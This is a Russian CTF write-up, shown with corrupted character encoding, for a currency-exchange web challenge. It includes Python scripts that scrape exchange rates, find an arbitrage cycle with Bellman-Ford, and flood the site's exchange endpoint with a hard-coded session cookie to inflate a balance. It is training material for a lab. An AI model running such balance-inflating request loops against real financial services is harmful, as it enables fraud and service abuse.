#medium #web #finance #coding 
#### –ó–∞–¥–∞—á–∞

| –í–≤–æ–¥–Ω—ã–µ   | –ú–∞—Ç–µ—Ä–∏–∞–ª—ã                                                                                                                                                                                                                                                                                                                      |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| –ò—Å—Ö–æ–¥–Ω–∏–∫–∏ | –ò—Å—Ö–æ–¥–Ω–∏–∫–∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è: [–∞—Ä—Ö–∏–≤](./assets/bucks.tar.gz)                                                                                                                                                                                                                                                                           |
| –°–∞–π—Ç      | https://t-bucks-37jqk0ki.spbctf.org/                                                                                                                                                                                                                                                                                           |
| –£—Å–ª–æ–≤–∏–µ   | –ù–∞ —Ç–∞–±–ª–æ –≤—Å–µ—Ö –ø—É–Ω–∫—Ç–æ–≤ –æ–±–º–µ–Ω–∞ –≤–∞–ª—é—Ç –ö–∞–ø–∏–±–∞—Ä–æ–≤—Å–∫–∞ –ø—Ä–æ–∏–∑–æ—à–µ–ª —Å–±–æ–π. –û–Ω–∏ –ø–æ–∫–∞–∑—ã–≤–∞—é—Ç –∫—É—Ä—Å –æ–¥–∏–Ω –∫ –æ–¥–Ω–æ–º—É, –∞ —Å—á–∞—Å—Ç–ª–∏–≤—ã–µ –∫–∞–ø–∏–±–∞—Ä—ã —Å—Ç–æ—è—Ç –≤ –æ—á–µ—Ä–µ–¥—è—Ö, —á—Ç–æ–±—ã –∑–∞–∫—É–ø–∏—Ç—å—Å—è –∫–∞–ø–∏–±–∞–∫—Å–∞–º–∏. –î–æ—Å—Ç—É–ø –∫ –Ω–∞—Å—Ç—Ä–æ–π–∫–µ —Ç–∞–±–ª–æ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω—è–µ—Ç—Å—è —Å—Ç—Ä–æ–≥–æ —Å—Ä–µ–¥–∏ —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–æ–≤ –æ–±–º–µ–Ω–Ω—ã—Ö –ø—É–Ω–∫—Ç–æ–≤. –†–∞–∑–±–æ–≥–∞—Ç–µ–π—Ç–µ –∏ –æ—Ç–∫—Ä–æ–π—Ç–µ —Å–≤–æ–π –ø—É–Ω–∫—Ç, —á—Ç–æ–±—ã –∏—Å–ø—Ä–∞–≤–∏—Ç—å –∫—É—Ä—Å—ã –≤–∞–ª—é—Ç. |
| –°—Ç–∞—Ç—É—Å    | üü¢ –†–µ—à–µ–Ω–æ –Ω–∞ CTF                                                                                                                                                                                                                                                                                                               |

#### –†–µ—à–µ–Ω–∏–µ

- –ù–∞ —Å–∞–π—Ç–µ –º—ã –Ω–∞—á–∏–Ω–∞–µ–º —Å –±–∞–ª–∞–Ω—Å–æ–º 100 –∫–∞–ø–∏–±–∞–∫—Å–æ–≤. –ò–º–µ–µ–º –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –º–µ–Ω—è—Ç—å —ç—Ç–∏ –∫–∞–ø–∏–±–∞–∫—Å—ã –Ω–∞ –ª—é–±—É—é –∏–∑ 50 –≤–∞–ª—é—Ç. –ù–æ –∫—É—Ä—Å –æ–±–º–µ–Ω–∞ –Ω–µ –∏–∑–≤–µ—Å—Ç–µ–Ω. –ü–æ—Å–ª–µ –æ–±–º–µ–Ω–∞ –Ω–∞ –ª—é–±—É—é –¥—Ä—É–≥—É—é –≤–∞–ª—é—Ç—É –µ–µ –º–æ–∂–Ω–æ —Ç–∞–∫ –∂–µ –æ–±–º–µ–Ω–∏–≤–∞—Ç—å –Ω–∞ –¥—Ä—É–≥–∏–µ –≤–∞–ª—é—Ç—ã –∏ –æ–±—Ä–∞—Ç–Ω–æ –Ω–∞ –∫–∞–ø–∏–±–∞–∫—Å—ã. –ù–∞—à–∞ –∑–∞–¥–∞—á–∞ —Ç–∞–∫ –æ–±–º–µ–Ω—è—Ç—å –≤–∞–ª—é—Ç—É, —á—Ç–æ—ã –≤ –∏—Ç–æ–≥–µ –∏–∑ 100 –∫–∞–ø–∏–±–∞–∫—Å–æ–≤ –ø–æ–ª—É—á–∏–ª–æ—Å—å 13337.
- –ì–∞–¥–∞—Ç—å –∏ —Ä—É–∫–∞–º–∏ –ø–æ–¥–±–∏—Ä–∞—Ç—å –∫—É—Ä—Å –±–µ—Å–ø–æ–ª–µ–∑–Ω–æ, –ª–µ–∑–µ–º –≤ –∏—Å—Ö–æ–¥–Ω–∏–∫–∏. –í –∏—Å—Ö–æ–¥–Ω–∏–∫–∞—Ö –∑–∞–¥–∞—á–∏ –ø–∏—Ç–æ–Ω–æ–≤—Å–∫–∏–π –±–µ–∫–µ–Ω–¥ —Å–∞–π—Ç–∞, –Ω–æ —Å –≤—ã—Ä–µ–∑–∞–Ω–Ω—ã–º –º–∞—Å—Å–∏–≤–æ–º –∫—É—Ä—Å–æ–≤ –≤–∞–ª—é—Ç. –û–¥–Ω–∞–∫–æ, –≤ –∫–æ–¥–µ –µ—Å—Ç—å –º–∞—Å—Å–∏–≤ —Å–æ –≤—Å–µ–º–∏ –∫–ª—é—á–∞–º–∏ –≤–∞–ª—é—Ç –∏ –æ–ø–∏—Å–∞–Ω–∏–µ –æ—Ç–∫—Ä—ã—Ç–æ–π –∞–ø–∏, –∫–æ—Ç–æ—Ä–∞—è –ø–æ –∫–æ–¥—É –≤–∞–ª—é—Ç—ã –æ—Ç–¥–∞–µ—Ç –æ–±–º–µ–Ω–Ω—ã–µ –∫—É—Ä—Å—ã –¥–ª—è —ç—Ç–æ–π –≤–∞–ª—é—Ç—ã –Ω–∞ –∫–∞–∂–¥—É—é –¥—Ä—É–≥—É—é. –°–º–æ—Ç—Ä–∏–º, –∫–∞–∫–∏–µ –∫—É—Ä—Å—ã –∏ –ø–æ–Ω–∏–º–∞–µ–º, —á—Ç–æ –∫–∞–∂–¥–∞—è –≤–∞–ª—é—Ç–∞ –ø–æ-—Ä–∞–∑–Ω–æ–º—É –º–µ–Ω—è–µ—Ç—Å—è –Ω–∞ –¥—Ä—É–≥–∏–µ 50 —à—Ç—É–∫.
- –° –ø–æ–º–æ—â—å—é —ç–Ω–¥–ø–æ–∏–Ω—Ç–∞ —Å –∫—É—Ä—Å–∞–º–∏ –≤–∞–ª—é—Ç —Å–æ–±–∏—Ä–∞–µ–º —É–¥–∞–ª–µ–Ω–Ω—ã–π –∏–∑ –∫–æ–¥–∞ –º–∞—Å—Å–∏–≤ —Å–æ –≤—Å–µ–º–∏ –æ–±–º–µ–Ω–Ω—ã–º–∏ –∫—É—Ä—Å–∞–º–∏.
- –ò–º–µ—è –≤—Å–µ –æ–±–º–µ–Ω–Ω—ã–µ –∫—É—Ä—Å—ã –æ—Å—Ç–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –Ω–∞–π—Ç–∏ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –º–∞—Ä—à—Ä—É—Ç –æ–±–º–µ–Ω–∞ –∏ –Ω–∞–∫—Ä—É—Ç–∏—Ç—å —Å–µ–±–µ –¥–µ–Ω–µ–≥. –ù–æ –¥–∞–Ω–Ω—ã—Ö –æ—á–µ–Ω—å –º–Ω–æ–≥–æ - 50 –≤–∞–ª—é—Ç –∏ –∫–∞–∂–¥–∞—è –Ω–∞ –∫–∞–∂–¥—É—é –º–æ–∂–µ—Ç –º–µ–Ω—è—Ç—å—Å—è. –ü—Ä–æ—Å—Ç—ã–º –ø–µ—Ä–µ–±–æ—Ä–æ–º –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, —Å–∫—Ä–∏–ø—Ç –≤–∏—Å–Ω–∏—Ç –Ω–∞–≥–ª—É—Ö–æ –∏ –æ—á–µ–Ω—å –¥–æ–ª–≥–æ —Å—á–∏—Ç–∞–µ—Ç. –ù–µ–π—Ä–æ–Ω–∫–∞ —Ç–æ–∂–µ –Ω–∏—á–µ–≥–æ –≤–Ω—è—Ç–Ω–æ–≥–æ –∑–∞–ø–∏–ª–∏—Ç—å –Ω–µ —Å–º–æ–≥–ª–∞. –ü—Ä–∏—à–ª–æ—Å—å –≥—É–≥–ª–∏—Ç—å –∞–ª–≥–æ—Ä–∏—Ç–º—ã –ø–æ–∏—Å–∫–æ–≤. –ù–∞—à–µ–ª—Å—è –∞–ª–≥–æ—Ä–∏—Ç–º –ë–µ–ª–ª–º–∞–Ω–∞-–§–æ—Ä–¥–∞, –∫–æ—Ç–æ—Ä—ã–π —Å—Ç—Ä–æ–∏—Ç –¥–µ—Ä–µ–≤–æ –∏ –±–µ–≥–∞—è –ø–æ —Ä–µ–±—Ä–∞–º –∏—â–µ—Ç —Å–∞–º—ã–π –æ–ø—Ç–∏–º–∞–ª—å–Ω—ã–π –ø—É—Ç—å. –ó–Ω–∞—è –Ω–∞–∑–≤–∞–Ω–∏–µ –∞–ª–≥–æ—Ä–∏—Ç–º–∞, –Ω–µ–π—Ä–æ–Ω–∫—É —É–∂–µ –ø—Ä–æ—â–µ –±—ã–ª–æ –∑–∞—Å—Ç–∞–∏–≤—Ç—å –Ω–∞–ø–∏—Å–∞—Ç—å —á—Ç–æ-—Ç–æ –≤–Ω—è—Ç–Ω–æ–µ, –ø–æ–º–æ–≥–∞—è –µ–π —Å –ø–æ–º–æ—â—å—é –Ω–∞–ø–∏—Å–∞–Ω–∏—è –æ—Ç–¥–µ–ª—å–Ω—ã—Ö –∫—É—Å–∫–æ–≤.
- –ö–æ–≥–¥–∞ –±—ã–ª –Ω–∞–π–¥–µ–Ω –º–∞—Ä—à—Ä—É—Ç –æ–±–º–µ–Ω–∞, –ø—Ä–∏–≤–æ–¥—è—â–∏–π –∫ 10% –ø—Ä–∏–±—ã–ª–∏, –≤—Å–µ —á—Ç–æ –æ—Å—Ç–∞–ª–æ—Å—å, —ç—Ç–æ –Ω–∞–ø–∏—Å–∞—Ç—å —Ü–∏–∫–ª–∏—á–µ—Å–∫–∏–µ –∑–∞–ø—Ä–æ—Å—ã –∫ —Å–∞–π—Ç—É –∏ –≥–æ–Ω—è—Ç—å –æ–±–º–µ–Ω, –ø–æ–∫–∞ –Ω–µ –Ω–∞–±–µ—Ä–µ—Ç—Å—è –Ω—É–∂–Ω–∞—è —Å—É–º–º–∞. –°–∫—Ä–∏–ø—Ç –º–æ–∂–Ω–æ –Ω–∞–ø–∏—Å–∞—Ç—å –≤ –∫–æ–Ω—Å–∏–ª–µ –±—Ä–∞—É–∑–µ—Ä–∞ - —ç—Ç–æ –ø—Ä–æ—â–µ –≤—Å–µ–≥–æ, –Ω–æ —Ç—É—Ç —É–∂–µ –≤—Å–µ –±—ã–ª–æ –Ω–∞ –ø–∏—Ç–æ–Ω–µ –∏ –∑–∞—Ä–ø–æ—Å—ã —Ç–æ–∂–µ –Ω–∞ –Ω–µ–º –æ—Ä–≥–∞–Ω–∏–∑–æ–≤–∞–ª. –ù—É–∂–Ω–æ –±—ã–ª–æ —Ç–æ–ª—å–∫–æ —Å –±—Ä–∞—É–∑–µ—Ä–∞ –≤–∑—è—Ç—å —Å–≤–æ—é –∫—É–∫—É –∏ —Å –Ω–µ–π —Å–ª–∞—Ç—å –∑–∞–ø—Ä–æ—Å—ã, —á—Ç–æ–±—ã –Ω–∞—á–∏—Å–ª–∏–ª–æ—Å—å –º–æ–µ–º—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é.
- 2 –º–∏–Ω—É—Ç—ã –¥—É–¥–æ—Å–∞ –∏ –Ω–∞ —Å—á–µ—Ç—É –Ω—É–∂–Ω–∞—è —Å—É–º–º–∞. –ü–æ–±–µ–¥–∞!


#### –ò—Å—Ö–æ–¥–Ω–∏–∫–∏

–°–∫—Ä–∏–ø—Ç —Å–±–æ—Ä–∞ –≤—Å–µ—Ö –æ–±–º–µ–Ω–Ω—ã—Ö –∫—É—Ä—Å–æ–≤:

```python
BASE_URL = "https://t-bucks-2arzsh9x.spbctf.org"

def fetch_rates(currency_code: CurrencyCode) -> list:
	response = requests.get(f"{BASE_URL}/currency/{currency_code.value}")
	if response.status_code != 200:
		raise Exception(f"–û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ –¥–ª—è {currency_code}: {response.status_code}")
	data = response.json()
	return data["rates"]

def build_rates_matrix() -> list[list[float | None]]:
	size = len(CURRENCIES)
	rates = [[None for _ in range(size)] for _ in range(size)]
	for currency_code in CURRENCIES:
		index = CURRENCIES[currency_code].index
		rates[index] = fetch_rates(currency_code)
	return rates
	
def main():
	try:
		RATES = build_rates_matrix()
		print("RATES = [")
		for row in RATES:
			print(f" {row},")
			print("]")
			
		with open("rates.py", "w") as f:
			f.write("RATES = [\n")
			for row in RATES:
				f.write(f" {row},\n")
				f.write("]\n")
		
	except Exception as e:
		print(f"–û—à–∏–±–∫–∞: {e}")

if __name__ == "__main__":
	main()
```

–°–∫—Ä–∏–ø—Ç –ø–æ–∏—Å–∫–∞ 

```python
# –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –∏—Å—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –≤ –≥—Ä–∞—Ñ —Å –ª–æ–≥–∞—Ä–∏—Ñ–º–∏—á–µ—Å–∫–∏–º–∏ –≤–µ—Å–∞–º–∏
graph = {}
for i, currency_from in enumerate(currencies):
	graph[currency_from] = {}
	for j, currency_to in enumerate(currencies):
		if rates[i][j] is not None:
			graph[currency_from][currency_to] = -math.log(rates[i][j])

# –ê–ª–≥–æ—Ä–∏—Ç–º –ë–µ–ª–ª–º–∞–Ω–∞-–§–æ—Ä–¥–∞ –¥–ª—è –ø–æ–∏—Å–∫–∞ –∞—Ä–±–∏—Ç—Ä–∞–∂–Ω–æ–≥–æ —Ü–∏–∫–ª–∞
def bellman_ford(graph, start):
	distance = {node: float('inf') for node in graph}
	predecessor = {node: None for node in graph}
	distance[start] = 0
	
	# –†–∞—Å—Å–ª–∞–±–ª–µ–Ω–∏–µ —Ä—ë–±–µ—Ä n-1 —Ä–∞–∑
	for _ in range(len(graph) - 1):
		for u in graph:
			for v in graph[u]:
				new_distance = distance[u] + graph[u][v]
				if new_distance < distance[v]:
					distance[v] = new_distance
					predecessor[v] = u
	
	# –ü–æ–∏—Å–∫ –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–∏–∫–ª–æ–≤
	for u in graph:
		for v in graph[u]:
			if distance[u] + graph[u][v] < distance[v]:
				# –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø—É—Ç—å –Ω–∞—á–∏–Ω–∞—è —Å –Ω–∞—á–∞–ª—å–Ω–æ–π –≤–∞–ª—é—Ç—ã
				current = start
				cycle = []
				visited = set()
				while True:
					cycle.append(current)
					next_node = predecessor.get(current)
					if next_node is None or next_node in visited:
						break
					visited.add(current)
					current = next_node
				# –¢–µ–ø–µ—Ä—å –¥–æ–±–∞–≤–ª—è–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–π —É–∑–µ–ª (–∑–∞–º—ã–∫–∞–Ω–∏–µ —Ü–∏–∫–ª–∞)
				cycle.append(start)
				return list(reversed(cycle)) # –≤—ã–≤–æ–¥–∏–º —Ü–∏–∫–ª –≤ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–º –ø–æ—Ä—è–¥–∫–µ
		return None

# –ù–∞—á–∏–Ω–∞–µ–º —Å –≤–∞–ª—é—Ç—ã "CAB"
start_currency = "CAB"
cycle = bellman_ford(graph, start_currency)

if cycle:
	print("–ù–∞–π–¥–µ–Ω –∞—Ä–±–∏—Ç—Ä–∞–∂–Ω—ã–π —Ü–∏–∫–ª:", cycle)
	# –†–∞—Å—á—ë—Ç –ø—Ä–∏–±—ã–ª—å–Ω–æ—Å—Ç–∏ –ø—Ä–æ—Ö–æ–∂–¥–µ–Ω–∏—è —Ü–∏–∫–ª–∞
	amount = 1.0
	for i in range(len(cycle)-1):
		curr_from = cycle[i]
		curr_to = cycle[i+1]
		idx_from = currencies.index(curr_from)
		idx_to = currencies.index(curr_to)
		rate = rates[idx_from][idx_to]
		amount *= rate
	print(f"–ü—Ä–∏–±—ã–ª—å –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ —Å 1 {start_currency}: {amount:.6f}")
else:
	print("–ê—Ä–±–∏—Ç—Ä–∞–∂–Ω—ã–π —Ü–∏–∫–ª –Ω–µ –Ω–∞–π–¥–µ–Ω")
```

–°–∫—Ä–∏–ø—Ç –¥—É–¥–æ—Å–∞ —Å–∞–π—Ç–∞, —á—Ç–æ–±—ã –Ω–∞–∫—Ä—É—Ç–∏—Ç—å –¥–µ–Ω–µ–≥ —Å –ø–æ–º–æ—â—å—é –º–Ω–æ–∂–µ—Å—Ç–≤–∞ –æ–±–º–µ–Ω–æ–≤:

```python
# –ü–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≤–∞–ª—é—Ç –¥–ª—è –æ–±–º–µ–Ω–∞
currencies = ['CAB', 'BTC', 'TJS', 'KPW', 'ETB', 'MNT', 'AOA', 'PHP', 'THB', 'JOD', 'GEL', 'STN', 'SHP', 'BAM', 'MYR', 'PLN', 'VND', 'MZN', 'NGN', 'AFN', 'SLL', 'AZN', 'BGN', 'HNL', 'MGA', 'CAB']

# –ò—Å—Ö–æ–¥–Ω–∞—è —Å—É–º–º–∞
initial_amount = 100
# —Ü–µ–ª—å
target_amount = 14000

# –¢–µ–∫—É—â–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
current_amount = initial_amount
current_currency = currencies[0]

# –ù–∞—à–∏ cookie
session_cookie = "__cfduid=1cfe1111ad134c1ea124b20543b5b8b3; session=eyJ1c2VyX2lkIjogIjNkOGVkNGVmMmIyYmYyODMzYmE2ZmZiMzQ3MWEyZjZjIiwgImJhbGFuY2VzIjogWzEwMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMF19.aAOu9Q.6LiX_FpIMf1uuymqa8144xDWzEM"

def get_balance(currency):
	headers = {"Cookie": session_cookie}
	response = requests.get(f"https://t-bucks-2arzsh9x.spbctf.org/currency/{currency}", headers=headers)
	if response.status_code != 200:
		raise Exception(f"–û—à–∏–±–∫–∞: {response.status_code}")
	balance = response.json()['balance']
	print(f"balance: {balance} {currency}")
	return balance

  

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –æ–±–º–µ–Ω–∞

def perform_exchange(source_currency, target_currency, amount):
	headers = {
		"Content-Type": "application/x-www-form-urlencoded",
		"Cookie": session_cookie
	}
	body = f"source_currency={source_currency}&target_currency={target_currency}&amount={amount}"
	response = requests.post("https://t-bucks-2arzsh9x.spbctf.org/exchange", headers=headers, data=body)
	if response.status_code == 400:
		raise Exception(f"–û—à–∏–±–∫–∞: {response.status_code}")

# –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –æ–±–º–µ–Ω–∞
while current_amount < target_amount:
	next_currency = currencies[(currencies.index(current_currency) + 1) % len(currencies)]
	perform_exchange(current_currency, next_currency, current_amount)
	new_balance = get_balance(next_currency)
	current_amount = new_balance
	current_currency = next_currency
	print(f"–û–±–º–µ–Ω {current_amount} {current_currency}. –û—Å—Ç–∞–ª–æ—Å—å –∑–∞—Ä–∞–±–æ—Ç–∞—Ç—å –µ—â—ë {target_amount - current_amount} CAB.")

print("\n–§–∏–Ω–∞–ª—å–Ω—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç:")
print(f"–°—É–º–º–∞: {current_amount} {current_currency}")
```

#### –°–∫—Ä–∏–Ω—ã

![](./assets/image-77.webp)

![](./assets/image-79.webp)
